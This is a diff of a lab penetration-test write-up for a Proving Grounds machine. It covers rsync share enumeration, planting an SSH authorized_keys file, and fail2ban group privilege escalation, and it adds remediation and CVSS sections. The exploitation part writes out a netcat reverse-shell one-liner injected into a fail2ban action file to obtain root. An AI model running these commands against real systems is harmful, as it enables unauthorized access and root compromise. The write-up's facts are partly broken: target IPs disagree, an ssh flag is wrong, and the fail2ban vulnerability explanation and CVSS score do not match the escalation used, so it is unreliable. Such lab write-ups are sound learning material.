@@ -13,19 +13,92 @@ IP: 192.168.143.126
 
 # Resolution summary
 - Located Rsync share
-- Found I can upload files to user fox's home directory (found in the rsync share)
-- Created an authorized_keys file in fox's home directory so I could login via SSH session
-- Found user is part of the fail2ban group
-- Googled steps to escalate privileges with a user being part of the fail2ban group
-- Followed the privilege escalation steps and received root shell
+- Discovered Files that I upload can be located in the rsync share's user fox's home directory.
+- To enable SSH login, I created an authorized_keys file in Fox's home directory.
+- The discovered user belongs to the fail2ban group.
+- Looked up ways to escalate privileges for a user who belongs to the fail2ban group on Google
+- After completing the privilege escalation procedures, a root shell was obtained.
+
 
 ## Improved skills
-- Locating Rsync shares
-- skill 2
+- Increased knowledge of rsync
+- Learned of the fail2ban group
 
 ## Used tools
 - nmap
 - rustscan
+
+### **Vulnerability Fix:** Initial Foothold
+#### Create An SSH Key In A Writable Rsync Share
+
+1. **Restrict Write Access:** Configure rsync shares to be read-only unless write access is absolutely necessary. If write access must be enabled, ensure it's restricted to authenticated and authorized users.
+    
+2. **Implement Strong Authentication:** Use rsync over SSH or set up rsync daemon authentication to control access to rsync shares. This ensures that only users with the correct credentials can access the shares, significantly reducing the risk of unauthorized write access.
+    
+3. **Use Firewalls and Access Control Lists (ACLs):** Restrict network access to the rsync daemon using firewalls and Access Control Lists. Limit access to trusted IP addresses or networks to reduce the attack surface.
+    
+4. **Regularly Review and Audit Share Permissions:** Periodically audit rsync configurations and permissions to ensure that they remain secure and reflect current access needs. Remove unnecessary write permissions and shares that are no longer in use.
+    
+5. **Secure Sensitive Data:** Avoid using rsync for synchronizing sensitive data unless the data can be encrypted in transit and access is tightly controlled. Consider alternative secure file transfer methods for highly sensitive information.
+    
+6. **Monitor Logs for Suspicious Activity:** Enable logging on the rsync server and monitor logs for any unusual or unauthorized access patterns. This can help in early detection of an attack or misuse.
+    
+7. **Educate Administrators and Users:** Ensure that those responsible for configuring and maintaining rsync shares are aware of the security risks and best practices for securing rsync.
+    
+8. **Update and Patch:** Keep the rsync software up to date with the latest patches and versions. Although this specific vulnerability is due to configuration, staying updated can protect against other potential vulnerabilities.
+    
+9. **Backup Important Data:** Regularly backup critical data. In case of data corruption or unauthorized modification, backups can provide a recovery path to restore lost or compromised files.
+    
+
+By carefully configuring rsync shares, restricting access, and monitoring use, organizations can mitigate the risks associated with writable rsync share vulnerabilities and protect their data and systems from unauthorized access or modification.
+
+
+### **Vulnerability Explanation:** Privilege Escalation
+#### Fail2Ban group privelege escalation
+
+#### Title: Vulnerability Due to Improper Fail2Ban Group Configuration
+
+#### Type of Vulnerability: Security Misconfiguration
+
+#### CWE Reference: CWE-16: Configuration
+
+#### Proposal for CVSS Score: 5.3 (Medium)
+
+- **CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N**
+- The medium score is justified by the potential network accessibility, low attack complexity, no privileges required, and no user interaction. The impact is primarily on integrity, with no direct impact on confidentiality or availability.
+
+#### Generic Description:
+
+Fail2Ban is an intrusion prevention software framework that protects computer servers from brute-force attacks. It monitors log files (e.g., /var/log/auth.log, /var/log/apache/access.log) and bans IPs that show malicious signs such as too many password failures, seeking for exploits, etc. A vulnerability arises when Fail2Ban is improperly configured, particularly regarding the group permissions assigned to the Fail2Ban service or the files it needs to access. This misconfiguration can hinder Fail2Ban's ability to modify firewall rules or access log files, potentially allowing attackers more time to exploit services due to ineffective banning.
+
+#### Specific Description:
+
+This vulnerability specifically concerns scenarios where Fail2Ban is set up with insufficient permissions due to being assigned to an incorrect or inadequately privileged group. For instance, if Fail2Ban cannot access certain log files because it's not part of the required group to read them, or if it cannot execute firewall rules due to insufficient permissions, attackers could continue their brute-force attempts without being blocked. The effectiveness of Fail2Ban relies on its ability to promptly read logs and update firewall rules, which is compromised in such a configuration mishap.
+
+
+### **Vulnerability Fix:** Privilege Escalation
+#### Fail2Ban group privelege escalation
+
+#### Remediation Plan:
+
+1. **Review Fail2Ban Configuration:** Regularly review the Fail2Ban configuration files and ensure that it is correctly set up to read all necessary log files. Verify that the Fail2Ban service is running with appropriate permissions to execute all its required actions, such as modifying firewall rules.
+    
+2. **Correct Group Permissions:** Ensure that the Fail2Ban process runs as a user with the necessary group memberships to access log files and execute system commands for banning IPs. This typically means being part of the adm or root group, depending on the system setup and what logs need to be accessed.
+    
+3. **Limit Fail2Ban Access:** While ensuring that Fail2Ban has sufficient permissions to perform its duties, also ensure that its permissions are limited to what is necessary for operation to follow the principle of least privilege, reducing the risk of exploitation.
+    
+4. **Secure and Monitor Configuration Files:** Protect Fail2Ban configuration files from unauthorized access and modifications. Monitor these files for unauthorized changes.
+    
+5. **Update and Patch Fail2Ban:** Regularly update Fail2Ban to the latest version to benefit from security patches, new features, and improved stability.
+    
+6. **Implement Logging and Alerting:** Enable comprehensive logging for Fail2Ban actions and monitor these logs for signs of misconfiguration or failure to ban attacking IPs. Set up alerting for critical Fail2Ban events to quickly address configuration issues or update firewall rules as needed.
+    
+7. **Regular Testing:** Periodically test Fail2Ban rules and configurations in a controlled environment to ensure they are effective against known attack patterns and that log file monitoring and IP banning are functioning as expected.
+    
+8. **Documentation and Training:** Maintain clear documentation on the Fail2Ban setup and configuration process. Train relevant IT staff on proper Fail2Ban configuration and maintenance to prevent misconfiguration issues.
+    
+
+By addressing these potential configuration vulnerabilities in Fail2Ban setups, organizations can enhance their server security posture and ensure effective protection against brute-force and other automated attacks.
 
 ---
 
@@ -132,67 +205,74 @@ Enumerated top 200 UDP ports:
 # Enumeration
 ## Port 873 -Rsync
 
-#### -Per googling port 873 enumeration I found "hacktricks" website showing to type "nmap -sV --script "rsync-list-modules" -p <PORT> <IP>" to enumerate shares:
+-We discovered the "hacktricks" website when searching for a method to enumerate shares using port 873: "nmap -sV — script “rsync-list-modules” -p [Port] [IP]"
 
 ![](Images/Pasted%20image%2020221015215909.png)
 
-#### -Found share "fox" typing "nmap -sV --script "rsync-list-modules" -p 873 192.168.143.126":
+- We locate the share fox by typing the following: 
+
+nmap -sV -script "rsync-list-modules" -p 873 192.168.143.126
 
 ![](Images/Pasted%20image%2020221015220513.png)
 #RsyncShare
 
-#### -Per googling port 873 enumeration I found the below web page showing how to list files/directory from rsync server
-
+- Searching for port 873 enumeration on Google yields the following webpage, which explains how to list files and directories from the rsync server.
+  
 ![](Images/Pasted%20image%2020221015220950.png)
 
 ![](Images/Pasted%20image%2020221015221123.png)
 
-#### -Typed "rsync -r 192.168.143.126::fox " and found the below files/directories showing user "fox" home directory and then downloaded all files/directories onto local machine by typing "rsync -av fox@192.168.143.126::fox/ ."
-
+- After typing "rsync -r 192.168.143.126::fox," we discovered the files and directories below, which displayed the user "fox" home directory. We then used "rsync -av fox@192.168.143.126::fox/" to download all of the files and directories to our local system.
+  
 ![](Images/Pasted%20image%2020221015221356.png)
 
 ![](Images/Pasted%20image%2020221015221635.png)
 
-#### -Found nothing interesting reading the files
+-After reading the data, we discover nothing intriguing.
 	
-#### -Tested if I can upload files users "fox" home directory by typing "echo "hello world" > testfile.txt" and typing "rsync testfile.txt -r 192.168.143.126::fox" to see if it uploaded to fox's home directory. And I found I can:
-
+- We attempt to upload files to the user’s “fox” home directory by running the following commands: “echo “hello world” > testfile.txt” and “rsync testfile.txt -r 192.168.143.126::fox” to check if the file has been uploaded.
+  
 ![](Images/Pasted%20image%2020221015221837.png)
 
-#### -The directions how to find out how to do this was found on the previous website showing the following: 
-
+- The previous website provided the following instructions on how to carry out these actions:
+  
 ![](Images/Pasted%20image%2020221015222046.png)
 
-#### -Googled "port 873 enumeration" and found the following page from hacktricks showing how to copy all files from your  local machine to the rsync server:
+- We search for "port 873 enumeration" on Google and discover the hacktricks page that explains how to copy every file from an rsync server to our local machine:
 
 ![](Images/Pasted%20image%2020221015222900.png)
 
 
-#### Then copied all rsync files to kali machine
-
+- Next, we transfer every rsync file to our Kali machine.
+  
 ---
 
 # Exploitation
 
 
-#### -Typed the following commands to create an authorized_keys file in fox's home directory so I can log in via SSH session:
--"mkdir fox" 
--"cd fox"
--"mkdir .ssh"
--"cd .ssh" 
--"touch id_rsa.pub" 
--"ssh-keygen -t rsa" 
--[Enter file in which to save the key (/home/kali/.ssh/id_rsa):] "/home/kali/Downloads/ProvingGroundsBoxes/Fail/fox/.ssh/id_rsa.pub"
--[Enter passphrase (empty for no passphrase):] "password"
--[Enter same passphrase again:] "password"
--"sudo mv id_rsa_pub authorized_keys"
--"cd .."
--"rsync -avp fox/ fox@192.168.120.149::fox/"
+- In order to create an authorized_keys file in Fox's home directory and commence an SSH session, we input the following commands:
+-
+mkdir fox
+cd fox
+mkdir .ssh
+cd .ssh
+touch id_rsa.pub
+ssh-keygen -t rsa
+[Enter file in which to save the key (/home/kali/.ssh/id_rsa):] "/home/kali/Downloads/ProvingGroundsBoxes/Fail/fox/.ssh/id_rsa.pub"
+[Enter passphrase (empty for no passphrase):] "password"
+[Enter same passphrase again:] "password"
+sudo mv id_rsa_pub authorized_keys
+cd ..
+rsync -avp fox/ fox@192.168.120.149::fox/
 
-#### -Navigated to directory where the "id_rsa" file was created after running "ssh-keygen -t rsa" and typed "chmod 600" to create the correct permissions for the private ssh key
+- We navigate to the directory where the "id_rsa" file was produced.
 
-#### -Typed "ssh -I id_rsa fox@192.168.143.126" and typed in "password" for the password and received an ssh session as user fox
+- To set the proper permissions for the SSH key, we type "chmod 600".
+  
+- We enter "ssh -I id_rsa fox@192.168.143.126" to log in.
 
+- We establish an SSH session as user fox by entering "password" as the password.
+  
 ![](Images/Pasted%20image%2020221016090756.png)
 
 ---
@@ -200,12 +280,14 @@ Enumerated top 200 UDP ports:
 # Privilege Escalation
 ## Local Enumeration
 
-#### -Ran "LunEnum.sh" script and found user "fox" is an owner of "fail2ban" group:
+- We download the LinEnum.sh script on the target machine
+
+- After running the "LinEnum.sh" script, we discover that user "fox" belongs to the "fail2ban" group:
 
 ![](Images/Pasted%20image%2020221016091122.png)
 
-#### -Googled "fail2ban privilege escalation" and found the following webpage showing the steps to escalate privileges:
-
+- After searching for "fail2ban privilege escalation" on Google, we discover the following web page that outlines how to do so:
+  
 ![](Images/Pasted%20image%2020221016091817.png)
 
 ![](Images/Pasted%20image%2020221016091921.png)
@@ -224,18 +306,20 @@ Enumerated top 200 UDP ports:
 ## Privilege Escalation vector
 ## Fail2Ban group privelege escalation
 
-#### -Per steps above I navigated to "/etc/fail2ban/action.d" folder and typed "ls –la" and found group "fail2ban" has write priviliges on file "iptables-multiport-log.conf":
-
+- Following the preceding procedures, we enter "ls –la" into the "/etc/fail2ban/action.d" directory and discover that group "fail2ban" has write permissions on the file "iptables-multiport-log.conf":
+  
 ![](Images/Pasted%20image%2020221016100412.png)
 
-#### -Typed "vim iptables-multiport-log.conf" and typed "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [my kali IP] >/tmp/f" to execute a reverse shell on port 85 (syntax found in www.revshells.com) towards the end of the file in vim
+- We type "vim iptables-multiport-log.conf"
 
+- Next, in the file at the end, we input "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [our kali IP] 85 >/tmp/f" to initiate a reverse shell on port 85.
+  
 ![](Images/Pasted%20image%2020221016100629.png)
 
-#### -Ran a "penelope" listener on kali machine listening on port 85
-
-#### -Typed "ssh @fox192.168.236.126" and typed in random passwords just to make "fail2ban" block my IP found in the steps to escalate privileges on the aforementioned website and then received a root shell on my "penelope" listener: 
-
+- On our Kali machine, we launch a "penelope" listener listening on port 85.
+  
+- Then, we received a root shell on our penelope listener after entering "ssh @fox192.168.236.126" and entering random passwords to force "fail2ban" to block our IP address.
+  
 ![](Images/Pasted%20image%2020221016111525.png)
 ---
 
